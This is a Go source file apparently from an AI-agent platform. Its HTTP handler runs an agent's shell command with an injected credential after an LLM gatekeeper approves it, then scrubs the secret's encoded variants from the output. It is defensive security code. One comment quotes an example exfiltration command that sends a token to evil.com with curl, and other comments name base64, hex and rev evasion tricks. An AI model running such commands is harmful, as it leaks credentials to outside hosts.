package api

// HandleExecute — keeper command-execution handler. After the
// gatekeeper allows the request the credential is injected and the
// agent's shell command is run inside its container, with output
// scrubbed for the credential value before being returned. Extracted
// from keeper.go.

import (
	"context"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/crewship-ai/crewship/internal/keeper"
	"github.com/crewship-ai/crewship/internal/keeper/gatekeeper"
	"github.com/crewship-ai/crewship/internal/provider"
	"github.com/crewship-ai/crewship/internal/scrubber"
)

type keeperExecuteBody struct {
	RequestingAgentID string `json:"requesting_agent_id"`
	RequestingCrewID  string `json:"requesting_crew_id"`
	WorkspaceID       string `json:"workspace_id"`
	CredentialID      string `json:"credential_id"`
	CredentialName    string `json:"credential_name"`
	TaskID            string `json:"task_id,omitempty"`
	Intent            string `json:"intent"`
	Command           string `json:"command"`
	EnvVar            string `json:"env_var,omitempty"`
	ContainerID       string `json:"container_id"`
}

// containsDangerousShellChars, envVarNamePattern, interpreterPattern,
// scriptToolPattern — all moved to keeper_helpers.go (pure functions,
// no handler state).

// HandleExecute handles POST /api/v1/internal/keeper/execute.
// The sidecar forwards this request when an agent calls POST /keeper/execute.
// On ALLOW, the handler runs the command inside the agent's container with the
// credential injected as an env var, then returns scrubbed output.
// The credential value never reaches the agent — only the command output does.

func (h *KeeperHandler) HandleExecute(w http.ResponseWriter, r *http.Request) {
	var body keeperExecuteBody
	if err := readJSON(r, &body); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON body"})
		return
	}

	if body.RequestingAgentID == "" || body.RequestingCrewID == "" ||
		body.WorkspaceID == "" ||
		body.Intent == "" || body.Command == "" || body.ContainerID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "requesting_agent_id, requesting_crew_id, workspace_id, intent, command, container_id required",
		})
		return
	}
	if body.CredentialID == "" && body.CredentialName == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "credential_id or credential_name required",
		})
		return
	}

	// Resolve credential_name to credential_id if only name provided
	if body.CredentialID == "" && body.CredentialName != "" {
		err := h.db.QueryRowContext(r.Context(), `
			SELECT c.id FROM credentials c
			JOIN agent_credentials ac ON ac.credential_id = c.id
			WHERE ac.agent_id = ? AND ac.env_var_name = ? AND c.workspace_id = ? AND c.deleted_at IS NULL
			LIMIT 1`,
			body.RequestingAgentID, body.CredentialName, body.WorkspaceID).Scan(&body.CredentialID)
		if err != nil {
			writeJSON(w, http.StatusNotFound, map[string]string{
				"error": "credential not found for name: " + body.CredentialName,
			})
			return
		}
	}

	if len(body.Command) > maxExecuteCommandLength {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "command exceeds maximum allowed length",
		})
		return
	}

	if strings.ContainsRune(body.Command, 0) {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "command contains invalid characters",
		})
		return
	}

	// Reject commands with shell metacharacters that enable command chaining,
	// piping to external destinations, or output redirection. This prevents
	// exfiltration attacks like "gh pr list; curl evil.com -d $TOKEN".
	if containsDangerousShellChars(body.Command) {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "command contains disallowed shell operators (;, &&, ||, |, $(), ${}, `, >)",
		})
		return
	}

	// Validate env_var format if provided
	if body.EnvVar != "" && !envVarNamePattern.MatchString(body.EnvVar) {
		writeJSON(w, http.StatusBadRequest, map[string]string{
			"error": "env_var contains invalid characters",
		})
		return
	}

	// Validate agent exists, is not deleted, and belongs to claimed crew+workspace
	var agentName, crewName, agentWorkspaceID string
	var agentCrewID sql.NullString
	err := h.db.QueryRowContext(r.Context(), `
		SELECT COALESCE(a.name,''), COALESCE(c.name,''), a.workspace_id, a.crew_id
		FROM agents a
		LEFT JOIN crews c ON c.id = a.crew_id
		WHERE a.id = ? AND a.deleted_at IS NULL`, body.RequestingAgentID).Scan(
		&agentName, &crewName, &agentWorkspaceID, &agentCrewID)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "requesting agent not found"})
			return
		}
		h.logger.Error("keeper execute: lookup agent", "error", err)
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "internal error"})
		return
	}
	if agentWorkspaceID != body.WorkspaceID {
		writeJSON(w, http.StatusForbidden, map[string]string{"error": "workspace boundary violation"})
		return
	}
	if agentCrewID.Valid && agentCrewID.String != body.RequestingCrewID {
		writeJSON(w, http.StatusForbidden, map[string]string{"error": "crew boundary violation"})
		return
	}

	// Look up credential metadata
	var credName string
	var secLevel int
	err = h.db.QueryRowContext(r.Context(), `
		SELECT name, COALESCE(security_level, 1)
		FROM credentials
		WHERE id = ? AND workspace_id = ? AND deleted_at IS NULL`,
		body.CredentialID, body.WorkspaceID).Scan(&credName, &secLevel)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "credential not found"})
			return
		}
		h.logger.Error("keeper execute: lookup credential", "error", err)
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "internal error"})
		return
	}

	// Determine the environment variable name for the credential
	envVar := body.EnvVar
	if envVar == "" {
		// Try to look up from agent_credentials assignment
		var assignedEnvVar string
		lookupErr := h.db.QueryRowContext(r.Context(),
			`SELECT env_var_name FROM agent_credentials WHERE agent_id = ? AND credential_id = ?`,
			body.RequestingAgentID, body.CredentialID).Scan(&assignedEnvVar)
		if lookupErr == nil && assignedEnvVar != "" && envVarNamePattern.MatchString(assignedEnvVar) {
			envVar = assignedEnvVar
		} else {
			// Fallback: derive from credential name
			envVar = strings.ToUpper(regexp.MustCompile(`[^A-Z0-9]+`).ReplaceAllString(
				strings.ToUpper(credName), "_"))
			if envVar == "" || !envVarNamePattern.MatchString(envVar) {
				envVar = "KEEPER_SECRET"
			}
		}
	}

	// Insert PENDING audit record
	reqID := generateCUID()
	req := keeper.Request{
		ID:                reqID,
		RequestingAgentID: body.RequestingAgentID,
		RequestingCrewID:  body.RequestingCrewID,
		CredentialID:      body.CredentialID,
		CredentialName:    credName,
		SecurityLevel:     keeper.SecurityLevel(secLevel),
		TaskID:            body.TaskID,
		Intent:            body.Intent,
		WorkspaceID:       body.WorkspaceID,
		CreatedAt:         time.Now().UTC(),
	}

	if _, err := h.db.ExecContext(r.Context(), `
		INSERT INTO keeper_requests
		  (id, requesting_agent_id, requesting_crew_id, credential_id, task_id, intent,
		   request_type, command, decision, created_at)
		VALUES (?, ?, ?, ?, NULLIF(?,?), ?, 'execute', ?, 'PENDING', ?)`,
		reqID, body.RequestingAgentID, body.RequestingCrewID, body.CredentialID,
		body.TaskID, "", body.Intent, body.Command, req.CreatedAt.Format(time.RFC3339)); err != nil {
		h.logger.Error("keeper execute: insert audit record", "error", err)
		// Non-fatal — continue with evaluation
	}

	// Load agent's recent conversation history for Keeper context
	execConvHistory := h.loadConversationHistory(r.Context(), body.RequestingAgentID)

	// Gatekeeper evaluation (include the command so the LLM can reason about it)
	evalReq := gatekeeper.EvalRequest{
		Request:        req,
		CredentialName: credName,
		SecurityLevel:  keeper.SecurityLevel(secLevel),
		AgentName:      agentName,
		CrewName:       crewName,
		Command:        body.Command,
		ConvHistory:    execConvHistory,
	}

	var gkResp keeper.GatekeeperResponse
	if h.gatekeeper != nil {
		var evalErr error
		gkResp, evalErr = h.gatekeeper.Evaluate(r.Context(), evalReq)
		if evalErr != nil {
			h.logger.Error("keeper execute: gatekeeper evaluate failed", "error", evalErr)
			gkResp = keeper.GatekeeperResponse{
				Decision:  string(keeper.DecisionDeny),
				Reason:    "Keeper evaluation failed — deny by default",
				RiskScore: 10,
			}
		}
	} else {
		gkResp = keeper.GatekeeperResponse{
			Decision:  string(keeper.DecisionDeny),
			Reason:    "Keeper not configured",
			RiskScore: 10,
		}
	}

	// Clamp risk score to valid range [1, 10]
	if gkResp.RiskScore < 1 {
		gkResp.RiskScore = 1
	}
	if gkResp.RiskScore > 10 {
		gkResp.RiskScore = 10
	}

	now := time.Now().UTC().Format(time.RFC3339)

	if gkResp.Decision != string(keeper.DecisionAllow) {
		// DENY or ESCALATE: update audit and return without executing
		if _, err := h.db.ExecContext(r.Context(), `
			UPDATE keeper_requests SET decision=?, reason=?, risk_score=?, decided_at=?, ollama_prompt=?, ollama_raw_response=? WHERE id=?`,
			gkResp.Decision, gkResp.Reason, gkResp.RiskScore, now,
			nullIfEmpty(gkResp.Prompt), nullIfEmpty(gkResp.RawLLMResponse), reqID); err != nil {
			h.logger.Error("keeper execute: update audit (deny)", "error", err)
		}
		h.logger.Info("keeper execute: denied",
			"request_id", reqID, "agent", agentName, "credential", credName, "decision", gkResp.Decision)
		if h.broadcaster != nil {
			h.broadcaster.BroadcastKeeperEvent(body.WorkspaceID, map[string]any{
				"request_id":      reqID,
				"request_type":    "execute",
				"agent_name":      agentName,
				"credential_name": credName,
				"intent":          body.Intent,
				"command":         body.Command,
				"decision":        gkResp.Decision,
				"reason":          gkResp.Reason,
				"risk_score":      gkResp.RiskScore,
				"decided_at":      now,
			})
		}
		writeJSON(w, http.StatusOK, keeper.ExecuteResult{
			RequestID: reqID,
			Decision:  keeper.Decision(gkResp.Decision),
			Reason:    gkResp.Reason,
			RiskScore: gkResp.RiskScore,
		})
		return
	}

	// ALLOW: retrieve secret and execute command in the agent's container
	if h.secrets == nil || h.container == nil {
		h.logger.Error("keeper execute: secrets store or container provider not configured")
		writeJSON(w, http.StatusInternalServerError, map[string]string{
			"error": "keeper execute not fully configured",
		})
		return
	}

	plainValue, found := h.secrets.Get(body.CredentialID)
	if !found {
		h.logger.Error("keeper execute: secret not in store", "credential_id", body.CredentialID)
		writeJSON(w, http.StatusInternalServerError, map[string]string{
			"error": "credential not available in secrets store",
		})
		return
	}

	execCtx, cancel := context.WithTimeout(r.Context(), executeTimeout)
	defer cancel()

	execResult, execErr := h.container.Exec(execCtx, provider.ExecConfig{
		ContainerID: body.ContainerID,
		Cmd:         []string{"sh", "-c", body.Command},
		Env:         []string{envVar + "=" + plainValue},
		User:        "1001:1001",
	})

	var rawOutput []byte
	exitCode := -1

	if execErr != nil {
		h.logger.Error("keeper execute: exec failed", "error", execErr, "container_id", body.ContainerID)
		// Return generic error message — never expose Docker internals to the agent
		rawOutput = []byte("command execution failed")
	} else {
		// Read output up to the configured limit
		rawOutput, _ = io.ReadAll(io.LimitReader(execResult.Reader, maxExecuteOutputBytes))
		execResult.Reader.Close()

		// Get the process exit code
		_, exitCode, _ = h.container.ExecInspect(execCtx, execResult.ExecID)
	}

	// Scrub the credential value from any output it may have leaked into.
	// Add encoding variants (base64, URL) to catch exfiltration attempts like
	// "echo $TOKEN | base64" that would otherwise bypass literal-only scrubbing.
	s := scrubber.New()
	if plainValue != "" {
		if err := s.AddPattern("keeper-secret", regexp.QuoteMeta(plainValue)); err != nil {
			h.logger.Warn("keeper execute: could not add scrub pattern", "error", err)
		}
		// Base64 standard encoding
		b64Std := base64.StdEncoding.EncodeToString([]byte(plainValue))
		if b64Std != plainValue {
			_ = s.AddPattern("keeper-secret", regexp.QuoteMeta(b64Std))
		}
		// Base64 URL-safe encoding (some tools use this)
		b64URL := base64.URLEncoding.EncodeToString([]byte(plainValue))
		if b64URL != b64Std && b64URL != plainValue {
			_ = s.AddPattern("keeper-secret", regexp.QuoteMeta(b64URL))
		}
		// URL-encoded variant
		urlEnc := url.QueryEscape(plainValue)
		if urlEnc != plainValue {
			_ = s.AddPattern("keeper-secret", regexp.QuoteMeta(urlEnc))
		}
		// Hex-encoded variant (catches `xxd -p`, `od -An -tx1` output)
		hexEnc := hex.EncodeToString([]byte(plainValue))
		_ = s.AddPattern("keeper-secret", regexp.QuoteMeta(hexEnc))
		// Reversed string (catches `rev` exfiltration)
		reversed := reverseString(plainValue)
		if reversed != plainValue {
			_ = s.AddPattern("keeper-secret", regexp.QuoteMeta(reversed))
		}
	}
	scrubbedOutput := s.Scrub(string(rawOutput))

	// Update the audit record with the final decision and exit code
	if _, err := h.db.ExecContext(r.Context(), `
		UPDATE keeper_requests SET decision=?, reason=?, risk_score=?, exit_code=?, decided_at=?, ollama_prompt=?, ollama_raw_response=? WHERE id=?`,
		string(keeper.DecisionAllow), gkResp.Reason, gkResp.RiskScore, exitCode, now,
		nullIfEmpty(gkResp.Prompt), nullIfEmpty(gkResp.RawLLMResponse), reqID); err != nil {
		h.logger.Error("keeper execute: update audit (allow)", "error", err)
	}

	h.logger.Info("keeper execute: completed",
		"request_id", reqID, "agent", agentName, "credential", credName,
		"exit_code", exitCode, "output_bytes", len(scrubbedOutput))

	if h.broadcaster != nil {
		h.broadcaster.BroadcastKeeperEvent(body.WorkspaceID, map[string]any{
			"request_id":      reqID,
			"request_type":    "execute",
			"agent_name":      agentName,
			"credential_name": credName,
			"intent":          body.Intent,
			"command":         body.Command,
			"decision":        string(keeper.DecisionAllow),
			"reason":          gkResp.Reason,
			"risk_score":      gkResp.RiskScore,
			"exit_code":       exitCode,
			"decided_at":      now,
		})
	}

	writeJSON(w, http.StatusOK, keeper.ExecuteResult{
		RequestID: reqID,
		Decision:  keeper.DecisionAllow,
		Reason:    gkResp.Reason,
		RiskScore: gkResp.RiskScore,
		Output:    scrubbedOutput,
		ExitCode:  exitCode,
	})
}

// GetRequest handles GET /api/v1/internal/keeper/request/{requestId}.
// Returns the status and decision of a previously submitted keeper request.
